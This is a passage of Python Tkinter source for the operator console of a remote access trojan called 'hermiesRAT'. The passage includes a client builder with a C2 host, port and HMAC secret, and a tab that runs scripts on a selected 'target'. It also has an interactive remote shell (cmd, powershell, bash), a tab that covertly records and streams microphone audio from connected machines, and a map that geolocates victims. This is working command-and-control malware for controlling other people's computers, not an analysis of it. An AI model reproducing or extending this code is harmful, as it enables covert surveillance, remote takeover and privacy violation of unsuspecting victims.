        self._scr_meta_lbl.pack(anchor="w", padx=10, pady=(0, 4))
        right = tk.Frame(outer, bg=T["BG"],
                         highlightbackground=T["ACCENT"], highlightthickness=1)
        outer.add(right, minsize=300)
        prev_hdr = tk.Frame(right, bg=T["BG2"], height=28)
        prev_hdr.pack(fill=tk.X); prev_hdr.pack_propagate(False)
        tk.Label(prev_hdr, text="Preview", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=10, pady=4)
        self._scr_shell_badge = tk.Label(prev_hdr, text="", bg=T["BG2"],
                                         fg=T["FG_DIM"], font=("Consolas", 8))
        self._scr_shell_badge.pack(side=tk.LEFT, padx=4)
        self._scr_preview = tk.Text(
            right, bg=T["BG2"], fg=T["FG"], font=FONT_MON, height=10,
            insertbackground=T["ACCENT"], selectbackground=T["BG4"],
            selectforeground=T["ACCENT"], relief="flat", borderwidth=0,
            highlightbackground=T["BG4"], highlightthickness=1,
            wrap=tk.NONE, undo=True)
        self._scr_preview.pack(fill=tk.X)
        ctrl = tk.Frame(right, bg=T["BG2"], height=42)
        ctrl.pack(fill=tk.X); ctrl.pack_propagate(False)
        tk.Button(ctrl, text="  ▶  RUN ON TARGET  ",
                  bg=T["ACCENT"], fg=T["HDR_FG"], font=("Segoe UI", 10, "bold"),
                  relief="flat", padx=14, pady=6, cursor="hand2",
                  command=self._scr_run).pack(side=tk.LEFT, padx=10, pady=5)
        tk.Button(ctrl, text="load to Task", bg=T["BG3"], fg=T["FG"], font=FONT,
                  relief="flat", padx=10, cursor="hand2",
                  command=self._scr_load_to_task).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(ctrl, text="clear output", bg=T["BG3"], fg=T["FG_DIM"],
                  font=("Segoe UI", 8), relief="flat", cursor="hand2",
                  command=lambda: self._clear_text(self._scr_out)
                  ).pack(side=tk.RIGHT, padx=10)
        out_hdr2 = tk.Frame(right, bg=T["BG2"], height=24)
        out_hdr2.pack(fill=tk.X); out_hdr2.pack_propagate(False)
        tk.Label(out_hdr2, text="Output", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=10, pady=2)
        self._scr_out = scrolledtext.ScrolledText(
            right, bg=T["BG"], fg=T["FG"], font=FONT_MON,
            state="disabled", wrap=tk.WORD, relief="flat", borderwidth=0,
            insertbackground=T["ACCENT"])
        self._scr_out.pack(fill=tk.BOTH, expand=True)

        #  [PLACEHOLDER: custom_script_slot_1] 
        # TODO: bind additional script categories or dynamic folder watchers here.
        # Pattern: add a new entry to self._scripts_data[<folder_name>] = [<script_dicts>]
        # Each script dict: {"name": str, "path": str, "shell": str, "size": int}
        #  [PLACEHOLDER: custom_script_slot_2] 
        # TODO: inject extra toolbar buttons into the scripts tab (e.g. upload script,
        # delete script, rename folder). Wire them to self._scr_folder_lb or _scr_file_lb.
        #  [PLACEHOLDER: custom_script_slot_3] 
        # TODO: add per-script argument injection UI. Provide a small Entry widget
        # between preview and RUN, then prepend/append args to cmd in _scr_run().
        # 
        self._scr_refresh()

    def _scr_refresh(self):
        self._scripts_data = _scan_scripts()
        self._script_sel   = None
        self._scr_folder_lb.delete(0, tk.END)
        self._scr_file_lb.delete(0, tk.END)
        self._scr_meta_lbl.configure(text="")
        self._scr_shell_badge.configure(text="")
        self._scr_preview.delete("1.0", tk.END)
        if not self._scripts_data:
            self._scr_folder_lb.insert(tk.END, "(no folders found)")
            self._append(self._scr_out,
                f"[scripts] no folders found under:\n  {SCRIPT_BASE_DIR}\n")
            return
        for folder in self._scripts_data:
            self._scr_folder_lb.insert(tk.END,
                f"  {folder}  ({len(self._scripts_data[folder])})")
        self._scr_refresh_target()
        self.log(f"[scripts] scanned {len(self._scripts_data)} folder(s)")

    def _scr_refresh_target(self):
        T = THEME
        if self.selected_cid is None:
            self._scr_target_lbl.configure(text="none selected", fg=T["RED"])
        else:
            info  = clients.get(self.selected_cid, {})
            label = info.get("label", f"id={self.selected_cid}")
            user_ = info.get("user", "")
            tag   = f"id={self.selected_cid}  {label}"
            if user_: tag += f"  user={user_}"
            self._scr_target_lbl.configure(text=tag, fg=T["GREEN"])

    def _scr_folder_select(self, event=None):
        sel = self._scr_folder_lb.curselection()
        if not sel: return
        folder  = self._scr_folder_lb.get(sel[0]).strip().rsplit("  (", 1)[0].strip()
        scripts = self._scripts_data.get(folder, [])
        self._scr_file_lb.delete(0, tk.END)
        self._script_sel = None
        self._scr_meta_lbl.configure(text="")
        self._scr_shell_badge.configure(text="")
        self._scr_preview.delete("1.0", tk.END)
        for s in scripts:
            self._scr_file_lb.insert(tk.END,
                f"  {s['name']}  [{s['shell']}]  {s['size'] / 1024:.1f} KB")

    def _scr_file_select(self, event=None):
        T = THEME
        fs = self._scr_folder_lb.curselection()
        fi = self._scr_file_lb.curselection()
        if not fs or not fi: return
        folder  = self._scr_folder_lb.get(fs[0]).strip().rsplit("  (", 1)[0].strip()
        scripts = self._scripts_data.get(folder, [])
        idx     = fi[0]
        if idx >= len(scripts): return
        s = scripts[idx]; self._script_sel = s
        self._scr_meta_lbl.configure(
            text=f"{s['path']}\nshell: {s['shell']}   size: {s['size'] / 1024:.2f} KB")
        self._scr_shell_badge.configure(text=f"[{s['shell']}]", fg=T["ACCENT"])
        try:
            with open(s["path"], "r", encoding="utf-8", errors="replace") as fh:
                src = fh.read()
        except Exception as e:
            src = f"# could not read: {e}"
        self._scr_preview.delete("1.0", tk.END)
        self._scr_preview.insert("1.0", src)

    def _scr_run(self):
        if self.selected_cid is None:
            self.log("[scripts] no target"); self._scr_refresh_target(); return
        if self._script_sel is None:
            self.log("[scripts] no script"); return
        cmd   = self._scr_preview.get("1.0", tk.END).strip()
        if not cmd: return
        shell = self._script_sel["shell"]; name = self._script_sel["name"]
        ts = time.strftime("%H:%M:%S")
        self._append(self._scr_out,
                     f"\n[{ts}] running  {name}  via {shell}"
                     f"  on id={self.selected_cid}\n{'' * 60}\n")
        threading.Thread(target=self._scr_worker,
                         args=(clients[self.selected_cid]["sock"], shell, cmd, name),
                         daemon=True).start()

    def _scr_worker(self, sock, shell, cmd, name):
        tx_b = rx_b = 0
        try:
            payload = json.dumps({"cmd": "shell",
                                  "data": {"shell": shell, "cmd": cmd}}).encode()
            tx_b = len(payload) + 4
            send_msg(sock, "shell", {"shell": shell, "cmd": cmd})
            resp = recv_msg(sock)
            if resp: rx_b = len(json.dumps(resp).encode()) + 4
            out = resp["data"] if resp else "<no response>"
        except Exception as e: out = f"<error: {e}>"
        self._append(self._scr_out,
                     f"[{time.strftime('%H:%M:%S')}] done  {name}\n{out}\n{'=' * 60}\n")
        self.log(f"[scripts] {name} done")
        if self.selected_cid is not None:
            self._dl_record(self.selected_cid, tx_b, rx_b, f"script/{shell}: {name}")

    def _scr_load_to_task(self):
        if self._script_sel is None: return
        self._task_load_payload(self._script_sel["shell"],
                                self._scr_preview.get("1.0", tk.END).strip())
        self._switch_tab("Task")

    #  builder tab

    def _build_builder_tab(self):
        T = THEME
        f = self._make_frame("builder")
        pane = ttk.PanedWindow(f, orient=tk.HORIZONTAL)
        pane.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        card = tk.Frame(pane, bg=T["BG2"])
        pane.add(card, weight=3)
        tk.Label(card, text="CLIENT BUILDER", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=16, pady=(14, 0))
        tk.Frame(card, bg=T["BG4"], height=1).pack(fill=tk.X, padx=16, pady=6)
        def _row(parent, label, default, width=36):
            row = tk.Frame(parent, bg=T["BG2"])
            row.pack(fill=tk.X, padx=16, pady=3)
            tk.Label(row, text=label, bg=T["BG2"], fg=T["FG_DIM"], font=FONT,
                     width=18, anchor="w").pack(side=tk.LEFT)
            var = tk.StringVar(value=default)
            ttk.Entry(row, textvariable=var, width=width).pack(side=tk.LEFT)
            return var
        self._b_host   = _row(card, "C2 host / IP",        "127.0.0.1")
        self._b_port   = _row(card, "C2 port",             "4444", width=10)
        self._b_secret = _row(card, "HMAC secret (b64)",
                              _active_secret.decode() if _active_secret else "", width=48)
        self._b_retry  = _row(card, "reconnect delay (s)", "5", width=6)
        tk.Frame(card, bg=T["BG4"], height=1).pack(fill=tk.X, padx=16, pady=8)
        out_row = tk.Frame(card, bg=T["BG2"]); out_row.pack(fill=tk.X, padx=16, pady=3)
        tk.Label(out_row, text="output path", bg=T["BG2"], fg=T["FG_DIM"], font=FONT,
                 width=18, anchor="w").pack(side=tk.LEFT)
        self._b_out = ttk.Entry(out_row, width=30)
        self._b_out.insert(0, "hermiesRAT_client_built.py")
        self._b_out.pack(side=tk.LEFT)
        ttk.Button(out_row, text="...", width=3,
                   command=self._b_browse).pack(side=tk.LEFT, padx=(4, 0))
        tk.Frame(card, bg=T["BG4"], height=1).pack(fill=tk.X, padx=16, pady=8)
        btn_row2 = tk.Frame(card, bg=T["BG2"]); btn_row2.pack(padx=16, pady=0, anchor="w")
        ttk.Button(btn_row2, text="generate secret",
                   command=self._b_gen_secret).pack(side=tk.LEFT, padx=(0, 8))
        ttk.Button(btn_row2, text="  build client  ",
                   style="Accent.TButton", command=self._b_build).pack(side=tk.LEFT)
        self._b_status = tk.Label(card, text="", bg=T["BG2"], fg=T["FG_DIM"], font=FONT_SML)
        self._b_status.pack(anchor="w", padx=16, pady=(10, 4))
        tk.Frame(card, bg=T["BG4"], height=1).pack(fill=tk.X, padx=16, pady=6)
        self._b_sync_btn = ttk.Button(card,
            text="sync secret -> server & restart listener",
            command=self._b_sync_server)
        self._b_sync_btn.pack(anchor="w", padx=16, pady=(0, 6))
        tk.Label(card, text="updates the running server to accept clients with the current secret",
                 bg=T["BG2"], fg=T["FG_DIM"], font=("Segoe UI", 8)
                 ).pack(anchor="w", padx=16, pady=(0, 10))
        mod_panel = tk.Frame(pane, bg=T["BG2"])
        pane.add(mod_panel, weight=2)
        hdr2 = tk.Frame(mod_panel, bg=T["BG2"])
        hdr2.pack(fill=tk.X, padx=10, pady=(12, 4))
        tk.Label(hdr2, text="MODULES", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT)
        ttk.Button(hdr2, text="refresh",
                   command=self._b_refresh_modules, width=10).pack(side=tk.RIGHT)
        self._b_mod_desc = tk.Label(mod_panel,
            text="select modules to bundle into the client",
            bg=T["BG2"], fg=T["FG_DIM"], font=("Segoe UI", 8),
            wraplength=240, justify="left")
        self._b_mod_desc.pack(anchor="w", padx=10, pady=(0, 6))
        msf = tk.Frame(mod_panel, bg=T["BG2"])
        msf.pack(fill=tk.BOTH, expand=True, padx=6)
        mc  = tk.Canvas(msf, bg=T["BG2"], highlightthickness=0)
        msb = ttk.Scrollbar(msf, orient=tk.VERTICAL, command=mc.yview)
        self._b_mod_inner = tk.Frame(mc, bg=T["BG2"])
        self._b_mod_inner.bind("<Configure>",
            lambda e: mc.configure(scrollregion=mc.bbox("all")))
        mc.create_window((0, 0), window=self._b_mod_inner, anchor="nw")
        mc.configure(yscrollcommand=msb.set)
        mc.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        msb.pack(side=tk.LEFT, fill=tk.Y)
        self._b_refresh_modules()

    #  shell tab

    def _build_shell_tab(self):
        T = THEME
        f = self._make_frame("Shell")
        pane = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
                              sashwidth=4, sashrelief="flat")
        pane.pack(fill=tk.BOTH, expand=True)
        left = tk.Frame(pane, bg=T["BG"]); pane.add(left, minsize=300, width=520)
        self.shell_out = scrolledtext.ScrolledText(
            left, bg=T["BG"], fg=T["FG"], font=FONT_MON,
            state="disabled", wrap=tk.WORD, relief="flat", borderwidth=0,
            insertbackground=T["ACCENT"])
        self.shell_out.pack(fill=tk.BOTH, expand=True)
        right = tk.Frame(pane, bg=T["BG"],
                         highlightbackground=T["ACCENT"], highlightthickness=1)
        pane.add(right, minsize=300)
        tk.Label(right, text="Output>", bg=T["BG"], fg=T["FG_DIM"],
                 font=FONT_MON, anchor="nw").pack(anchor="nw", padx=8, pady=4)
        self._shell_out_right = scrolledtext.ScrolledText(
            right, bg=T["BG"], fg=T["FG"], font=FONT_MON,
            state="disabled", wrap=tk.WORD, relief="flat", borderwidth=0)
        self._shell_out_right.pack(fill=tk.BOTH, expand=True)
        tk.Frame(f, bg=T["ACCENT"], height=2).pack(fill=tk.X, side=tk.BOTTOM)
        bar = tk.Frame(f, bg=T["BG2"], height=52)
        bar.pack(fill=tk.X, side=tk.BOTTOM); bar.pack_propagate(False)
        tk.Button(bar, text="  CLEAR OUTPUT  ", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=6,
                  command=lambda: self._clear_text(self._shell_out_right)
                  ).pack(side=tk.RIGHT, padx=(4, 10), pady=8)
        tk.Button(bar, text="  CLEAR INPUT  ", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=6,
                  command=lambda: self._clear_text(self.shell_out)
                  ).pack(side=tk.RIGHT, padx=(0, 4), pady=8)
        self.shell_var = tk.StringVar(value="cmd")
        for v in ("cmd", "powershell", "bash"):
            tk.Radiobutton(bar, text=v, variable=self.shell_var, value=v,
                           bg=T["BG2"], fg=T["FG"], selectcolor=T["BG3"],
                           activebackground=T["BG2"], activeforeground=T["ACCENT"],
                           font=FONT, bd=0, highlightthickness=0
                           ).pack(side=tk.LEFT, padx=6, pady=12)
        tk.Label(bar, text=">", bg=T["BG2"], fg=T["ACCENT"],
                 font=FONT_MON).pack(side=tk.LEFT, padx=(4, 2))
        self.shell_entry = ttk.Entry(bar, font=FONT_MON, width=40)
        self.shell_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, pady=12)
        self.shell_entry.bind("<Return>", lambda e: self._shell_send())
        tk.Button(bar, text="send", bg=T["BG3"], fg=T["FG"], font=FONT,
                  relief="flat", command=self._shell_send).pack(side=tk.LEFT, padx=6)

    #  mic tab

    def _build_mic_tab(self):
        T = THEME
        f = self._make_frame("Mic")

        hdr = tk.Frame(f, bg=T["BG2"], height=36)
        hdr.pack(fill=tk.X); hdr.pack_propagate(False)
        tk.Label(hdr, text="MIC CAPTURE", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=14, pady=6)
        tk.Label(hdr, text="TARGET:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=(20, 4), pady=6)
        self._mic_target_lbl = tk.Label(hdr, text="none selected",
                                         bg=T["BG2"], fg=T["ACCENT"],
                                         font=("Segoe UI", 9, "bold"))
        self._mic_target_lbl.pack(side=tk.LEFT, pady=6)

        ctrl = tk.Frame(f, bg=T["BG2"], height=44)
        ctrl.pack(fill=tk.X); ctrl.pack_propagate(False)

        tk.Label(ctrl, text="Duration (s):", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(14, 4), pady=10)
        self._mic_dur_var = tk.StringVar(value="5")
        dur_e = tk.Entry(ctrl, textvariable=self._mic_dur_var, bg=T["BG3"], fg=T["FG"],
                         insertbackground=T["ACCENT"], font=FONT_MON, width=5, relief="flat",
                         highlightbackground=T["BG4"], highlightthickness=1)
        dur_e.pack(side=tk.LEFT, pady=10)

        tk.Button(ctrl, text="  RECORD  ", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=4,
                  cursor="hand2", command=self._mic_record).pack(side=tk.LEFT, padx=(14, 4), pady=8)

        self._mic_stream_btn = tk.Button(ctrl, text="  STREAM  ", bg=T["BG3"], fg=T["FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=4,
                  cursor="hand2", command=self._mic_toggle_stream)
        self._mic_stream_btn.pack(side=tk.LEFT, padx=(0, 4), pady=8)

        tk.Button(ctrl, text="STOP", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=10, pady=4,
                  cursor="hand2", command=self._mic_stop_stream).pack(side=tk.LEFT, padx=(0, 4), pady=8)

        tk.Button(ctrl, text="save .wav", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=10, pady=4,
                  cursor="hand2", command=self._mic_save).pack(side=tk.LEFT, padx=(0, 4), pady=8)

        tk.Button(ctrl, text="clear", bg=T["BG3"], fg=T["FG_DIM"],
                  font=("Segoe UI", 8), relief="flat", padx=8, pady=4,
                  cursor="hand2",
                  command=lambda: self._clear_text(self._mic_out)).pack(side=tk.RIGHT, padx=12, pady=8)

        self._mic_status = tk.Label(ctrl, text="idle", bg=T["BG2"], fg=T["FG_DIM"],
                                    font=FONT_SML)
        self._mic_status.pack(side=tk.RIGHT, padx=8)

        pane = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
                              sashwidth=4, sashrelief="flat")
        pane.pack(fill=tk.BOTH, expand=True)

        left = tk.Frame(pane, bg=T["BG2"])
        pane.add(left, minsize=240, width=300)

        tk.Label(left, text="QUICK CMDS", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", padx=10, pady=(10, 2))
        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=10, pady=2)

        tk.Label(left, text="[W] Windows", bg=T["BG2"], fg=T["FG_DIM"],
                 font=("Segoe UI", 8, "bold")).pack(anchor="w", padx=10, pady=(4, 1))
        win_cmds = [
            ("list devices",   "powershell",
             "Get-PnpDevice | Where-Object {$_.Class -eq 'AudioEndpoint'} | Select Name,Status"),
            ("mic devices",    "powershell",
             "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')|Out-Null;"
             "[System.Windows.Forms.SystemInformation]::MonitorCount|Out-Null;"
             "Get-WmiObject Win32_SoundDevice | Select Name,Status,Manufacturer"),
            ("vol level",      "powershell",
             "$code='[DllImport(\"user32.dll\")]public static extern int SendMessage(IntPtr h,int m,int w,int l);';"
             "Add-Type -MemberDefinition $code -Name V -Namespace W -EA SilentlyContinue;"
             "(Get-AudioDevice -Playback).Volume 2>$null; "
             "Get-WmiObject Win32_SoundDevice | Select Name,Status"),
            ("audio services", "powershell",
             "Get-Service -Name 'Audiosrv','AudioEndpointBuilder' | Select Name,Status,StartType"),
            ("audio procs",    "powershell",
             "Get-Process | Where-Object {$_.MainWindowTitle -match 'audio|sound|mic|record'} "
             "| Select Name,Id,CPU"),
        ]
        whost = tk.Frame(left, bg=T["BG2"])
        whost.pack(fill=tk.X, padx=10, pady=(0, 4))
        for lbl_t, sh, cmd in win_cmds:
            tk.Button(whost, text=lbl_t, bg=T["BG4"], fg=T["FG"],
                      font=("Segoe UI", 8), relief="flat", padx=6, pady=3,
                      cursor="hand2",
                      command=lambda s=sh, c=cmd: self._mic_inject(s, c)
                      ).pack(fill=tk.X, pady=1, padx=2)

        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=10, pady=(4, 2))
        tk.Label(left, text="[L] Linux", bg=T["BG2"], fg=T["FG_DIM"],
                 font=("Segoe UI", 8, "bold")).pack(anchor="w", padx=10, pady=(2, 1))
        linux_cmds = [
            ("list devices", "bash", "arecord -l 2>/dev/null; pactl list sources short 2>/dev/null"),
            ("pulse sources","bash", "pactl list sources 2>/dev/null | grep -E 'Name:|State:|Description:'"),
            ("alsa cards",   "bash", "cat /proc/asound/cards 2>/dev/null"),
            ("mic procs",    "bash", "lsof /dev/snd/* 2>/dev/null | head -20"),
            ("vol levels",   "bash", "amixer get Master 2>/dev/null; amixer get Capture 2>/dev/null"),
        ]
        lhost = tk.Frame(left, bg=T["BG2"])
        lhost.pack(fill=tk.X, padx=10, pady=(0, 10))
        for lbl_t, sh, cmd in linux_cmds:
            tk.Button(lhost, text=lbl_t, bg=T["BG4"], fg=T["FG"],
                      font=("Segoe UI", 8), relief="flat", padx=6, pady=3,
                      cursor="hand2",
                      command=lambda s=sh, c=cmd: self._mic_inject(s, c)
                      ).pack(fill=tk.X, pady=1, padx=2)

        right = tk.Frame(pane, bg=T["BG"],
                         highlightbackground=T["ACCENT"], highlightthickness=1)
        pane.add(right, minsize=400)

        out_hdr = tk.Frame(right, bg=T["BG2"], height=26)
        out_hdr.pack(fill=tk.X); out_hdr.pack_propagate(False)
        tk.Label(out_hdr, text="Output / Audio log", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=10, pady=4)

        self._mic_out = scrolledtext.ScrolledText(
            right, bg=T["BG"], fg=T["FG"], font=FONT_MON,
            state="disabled", wrap=tk.WORD, relief="flat", borderwidth=0,
            insertbackground=T["ACCENT"])
        self._mic_out.pack(fill=tk.BOTH, expand=True)

    def _mic_refresh_target(self):
        T = THEME
        if self.selected_cid is None:
            self._mic_target_lbl.configure(text="none selected", fg=T["RED"])
        else:
            info  = clients.get(self.selected_cid, {})
            label = info.get("label", f"id={self.selected_cid}")
            user_ = info.get("user", "")
            tag   = f"id={self.selected_cid}  {label}"
            if user_: tag += f"  user={user_}"
            self._mic_target_lbl.configure(text=tag, fg=T["GREEN"])

    def _mic_inject(self, shell, cmd):
        if self.selected_cid is None:
            self.log("[mic] no target"); self._mic_refresh_target(); return
        self._append(self._mic_out, f"[{time.strftime('%H:%M:%S')}] >> [{shell}] {cmd}\n")
        threading.Thread(target=self._mic_inject_worker,
                         args=(clients[self.selected_cid]["sock"], shell, cmd),
                         daemon=True).start()

    def _mic_inject_worker(self, sock, shell, cmd):
        try:
            send_msg(sock, "shell", {"shell": shell, "cmd": cmd})
            resp = recv_msg(sock)
            out  = resp["data"] if resp else "<no response>"
        except Exception as e:
            out = f"<error: {e}>"
        self._append(self._mic_out, f"{out}\n{''*60}\n")

    def _mic_record(self):
        if self.selected_cid is None:
            self.log("[mic] no target"); self._mic_refresh_target(); return
        try:
            duration = float(self._mic_dur_var.get())
        except ValueError:
            duration = 5.0
        self._mic_status.configure(text=f"recording {duration}s ...", fg=THEME["ACCENT"])
        self._append(self._mic_out,
                     f"\n[{time.strftime('%H:%M:%S')}] >> recording {duration}s ...\n")
        threading.Thread(target=self._mic_record_worker,
                         args=(clients[self.selected_cid]["sock"], duration),
                         daemon=True).start()

    def _mic_record_worker(self, sock, duration):
        try:
            send_msg(sock, "mic_record", {"duration": duration})
            resp  = recv_msg(sock)
            # resp = {"cmd": "mic_resp", "data": {"ok": True/False, "data": "<b64>", "method": "..."}}
            inner = (resp or {}).get("data") or {}
            if not isinstance(inner, dict):
                inner = {}
            if not inner.get("ok") or not inner.get("data"):
                err = inner.get("error", "<no data returned>")
                self._append(self._mic_out, f"<error: {err}>\n")
                self.after(0, lambda: self._mic_status.configure(text="error", fg=THEME["RED"]))
                return
            raw    = base64.b64decode(inner["data"])
            method = inner.get("method", "?")
            self._mic_wav_data = raw
            kb     = len(raw) / 1024
            self._append(self._mic_out,
                         f"[{time.strftime('%H:%M:%S')}] << done  method={method}  "
                         f"{kb:.1f} KB received\n{'='*60}\n")
            self.after(0, lambda: self._mic_status.configure(
                text=f"got {kb:.1f} KB  method={method}", fg=THEME["GREEN"]))
            self.log(f"[mic] recorded {kb:.1f} KB via {method}")
        except Exception as e:
            self._append(self._mic_out, f"<error: {e}>\n")
            self.after(0, lambda: self._mic_status.configure(text=f"error: {e}", fg=THEME["RED"]))

    def _mic_toggle_stream(self):
        if self._mic_streaming:
            self._mic_stop_stream()
        else:
            self._mic_start_stream()

    def _mic_start_stream(self):
        if self.selected_cid is None:
            self.log("[mic] no target"); return
        if self._mic_streaming:
            return
        self._mic_streaming = True
        self._mic_stream_btn.configure(text="  STREAMING  ", fg=THEME["GREEN"])
        self._mic_status.configure(text="streaming ...", fg=THEME["ACCENT"])
        self._mic_stream_frames = []
        self._append(self._mic_out,
                     f"\n[{time.strftime('%H:%M:%S')}] >> mic stream started\n")
        sock = clients[self.selected_cid]["sock"]
        threading.Thread(target=self._mic_stream_worker, args=(sock,), daemon=True).start()

    def _mic_stream_worker(self, sock):
        import struct as _st
        try:
            send_msg(sock, "mic_stream", {})
            while self._mic_streaming:
                resp = recv_msg(sock)
                if resp is None:
                    break
                cmd  = resp.get("cmd", "")
                data = resp.get("data")
                if cmd == "mic_stream_ended" or data is None:
                    break
                if cmd == "mic_chunk" and data:
                    chunk = base64.b64decode(data)
                    self._mic_stream_frames.append(chunk)
                    n_chunks = len(self._mic_stream_frames)
                    if n_chunks % 10 == 0:
                        kb = sum(len(x) for x in self._mic_stream_frames) / 1024
                        self.after(0, lambda k=kb: self._mic_status.configure(
                            text=f"streaming  {k:.1f} KB rcv", fg=THEME["ACCENT"]))
        except Exception as e:
            self._append(self._mic_out, f"<stream error: {e}>\n")
        finally:
            self._mic_streaming = False
            if self._mic_stream_frames:
                import io as _io, wave as _wv
                buf = _io.BytesIO()
                with _wv.open(buf, 'wb') as wf:
                    wf.setnchannels(1)
                    wf.setsampwidth(2)
                    wf.setframerate(16000)
                    wf.writeframes(b''.join(self._mic_stream_frames))
                self._mic_wav_data = buf.getvalue()
                kb = len(self._mic_wav_data) / 1024
                self._append(self._mic_out,
                             f"[{time.strftime('%H:%M:%S')}] << stream ended  {kb:.1f} KB\n{'='*60}\n")
                self.after(0, lambda k=kb: (
                    self._mic_status.configure(text=f"done  {k:.1f} KB", fg=THEME["GREEN"]),
                    self._mic_stream_btn.configure(text="  STREAM  ", fg=THEME["FG"])
                ))
            else:
                self.after(0, lambda: (
                    self._mic_status.configure(text="stream ended (no data)", fg=THEME["FG_DIM"]),
                    self._mic_stream_btn.configure(text="  STREAM  ", fg=THEME["FG"])
                ))

    def _mic_stop_stream(self):
        if not self._mic_streaming or self.selected_cid is None:
            return
        try:
            send_msg(clients[self.selected_cid]["sock"], "mic_stream_stop", None)
        except Exception:
            pass
        self._mic_streaming = False
        self._mic_stream_btn.configure(text="  STREAM  ", fg=THEME["FG"])
        self._mic_status.configure(text="stopped", fg=THEME["FG_DIM"])

    def _mic_save(self):
        if not self._mic_wav_data:
            self.log("[mic] nothing to save"); return
        path = filedialog.asksaveasfilename(
            defaultextension=".wav", filetypes=[("WAV audio", "*.wav"), ("All", "*.*")])
        if not path:
            return
        try:
            with open(path, "wb") as fh:
                fh.write(self._mic_wav_data)
            self.log(f"[mic] saved {len(self._mic_wav_data)//1024} KB -> {path}")
            self._mic_status.configure(text=f"saved -> {os.path.basename(path)}", fg=THEME["GREEN"])
        except Exception as e:
            self.log(f"[mic] save error: {e}")

    #  map tab

    def _build_map_tab(self):
        T = THEME
        f = self._make_frame("Map")

        hdr = tk.Frame(f, bg=T["BG2"], height=36)
        hdr.pack(fill=tk.X); hdr.pack_propagate(False)
        tk.Label(hdr, text="CLIENT GEO MAP", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=14, pady=6)

        ctrl = tk.Frame(f, bg=T["BG2"], height=42)
        ctrl.pack(fill=tk.X); ctrl.pack_propagate(False)
        tk.Button(ctrl, text="  GEO SELECTED  ", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 9, "bold"), relief="flat", padx=12, pady=4,
                  cursor="hand2", command=self._map_geo_selected
                  ).pack(side=tk.LEFT, padx=(14, 6), pady=6)
        tk.Button(ctrl, text="  GEO ALL  ", bg=T["BG3"], fg=T["FG"],
                  font=("Segoe UI", 9, "bold"), relief="flat", padx=12, pady=4,
                  cursor="hand2", command=self._map_geo_all
                  ).pack(side=tk.LEFT, padx=(0, 6), pady=6)
        tk.Button(ctrl, text="geo from client", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=10, pady=4,
                  cursor="hand2", command=self._map_geo_from_client
                  ).pack(side=tk.LEFT, padx=(0, 6), pady=6)
        tk.Button(ctrl, text="clear", bg=T["BG3"], fg=T["FG_DIM"],
                  font=("Segoe UI", 8), relief="flat", padx=8, pady=4,
                  cursor="hand2", command=self._map_clear
                  ).pack(side=tk.RIGHT, padx=12, pady=6)
        self._map_status = tk.Label(ctrl, text="", bg=T["BG2"], fg=T["FG_DIM"], font=FONT_SML)
        self._map_status.pack(side=tk.RIGHT, padx=8)

        pane = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
                              sashwidth=4, sashrelief="flat")
        pane.pack(fill=tk.BOTH, expand=True)

        #  map canvas (tkintermapview if available, else coord canvas)
        map_host = tk.Frame(pane, bg=T["BG"])
        pane.add(map_host, minsize=400, width=720)

        self._map_has_lib = False
        try:
            import tkintermapview
            self._map_widget = tkintermapview.TkinterMapView(
                map_host, width=600, height=500, corner_radius=0)
            self._map_widget.pack(fill=tk.BOTH, expand=True)
            self._map_widget.set_tile_server("https://a.tile.openstreetmap.org/{z}/{x}/{y}.png")
            self._map_widget.set_position(20, 0)
            self._map_widget.set_zoom(2)
            self._map_has_lib = True
            self._map_markers = {}
        except ImportError:
            # fallback: draw world dots on a canvas
            self._map_canvas = tk.Canvas(map_host, bg="#0a0a0a", highlightthickness=0)
            self._map_canvas.pack(fill=tk.BOTH, expand=True)
            self._map_canvas.create_text(10, 10, anchor="nw",
                text="tkintermapview not installed  --  pip install tkintermapview",
                fill=T["ACCENT"], font=FONT_SML)
            self._map_dots = {}
            self._map_canvas.bind("<Configure>", lambda e: self._map_redraw_canvas())

        #  sidebar
        right = tk.Frame(pane, bg=T["BG2"],
                         highlightbackground=T["ACCENT"], highlightthickness=1)
        pane.add(right, minsize=280)

        hdr2 = tk.Frame(right, bg=T["BG2"], height=26)
        hdr2.pack(fill=tk.X); hdr2.pack_propagate(False)
